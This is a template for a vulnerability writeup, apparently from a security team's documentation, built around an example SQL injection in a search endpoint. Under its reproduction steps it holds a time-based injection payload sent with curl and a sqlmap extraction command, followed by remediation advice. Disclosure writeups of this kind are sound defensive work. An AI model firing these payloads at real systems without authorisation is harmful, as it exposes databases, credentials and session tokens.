# Example: SQL Injection in Search Endpoint

*Use this page as a template — copy it for new writeups and delete what you
don't need.*

## Target

- **Application:** Example Corp internal portal
- **Endpoint:** `GET /search?q=`
- **Class:** SQL Injection (CWE-89)
- **Severity:** High (CVSS 3.1: 8.6)

## Summary

The `q` parameter on the search endpoint was concatenated directly into a
backend SQL query without sanitization, allowing boolean-based blind
injection and full database extraction via time-based techniques.

## Steps to reproduce

=== "Detection"

    ```bash
    curl -s "https://target.tld/search?q=test' AND SLEEP(5)-- -"
    ```

=== "Extraction (sqlmap)"

    ```bash
    sqlmap -u "https://target.tld/search?q=test" \
      --batch --technique=T --dbs
    ```

!!! danger "Impact"
    Full read access to the application database, including user credential
    hashes and session tokens.

## Remediation

- Use parameterized queries / prepared statements everywhere user input
  touches SQL.
- Apply least-privilege DB accounts for the web app user.
- Add WAF rules as a defense-in-depth measure, not a primary fix.

## Timeline

| Date       | Event                     |
|------------|---------------------------|
| YYYY-MM-DD | Reported to vendor        |
| YYYY-MM-DD | Vendor acknowledged       |
| YYYY-MM-DD | Fix deployed               |
| YYYY-MM-DD | Public disclosure          |
